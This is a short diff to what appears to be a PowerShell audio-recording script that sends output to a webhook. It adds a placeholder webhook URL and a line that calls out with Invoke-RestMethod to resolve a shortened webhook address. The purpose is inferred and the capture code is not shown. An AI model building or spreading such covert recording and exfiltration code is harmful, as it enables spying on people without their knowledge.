@@ -12,7 +12,8 @@ USAGE
 
 #>
 
-$hookurl = 'YOUR_WEBHOOK_HERE'
+$hookurl = 'YOUR_WEBHOOK_HERE' # can be shortened
+if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
 
 Function RecordAudio{
 param ([int[]]$t)
